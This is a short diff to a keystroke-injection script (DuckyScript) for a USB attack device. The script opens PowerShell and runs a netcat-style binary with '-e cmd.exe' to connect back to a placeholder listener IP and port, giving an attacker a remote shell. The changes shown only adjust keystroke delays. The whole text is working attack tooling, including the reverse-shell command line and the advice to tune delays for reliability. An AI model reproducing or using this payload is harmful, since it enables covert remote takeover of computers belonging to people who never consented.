@@ -6,7 +6,7 @@ REM <IP_ADDR> - Change the IP to your listener IP
 REM <PORT>  - Port of listener
 
 REM If you do not get a connection after a couple of tries increase the DEFAULTDELAY
-DEFAULTDELAY 200
+DEFAULTDELAY 150
 
 REM Open Powershell
 GUI r
@@ -27,7 +27,7 @@ ENTER
 REM Connect to listener
 STRING ./a.exe <IP_ADDR> <PORT> -e cmd.exe -d
 ENTER
-DELAY 400
+
 
 REM Exit Powershell
 ALT F4
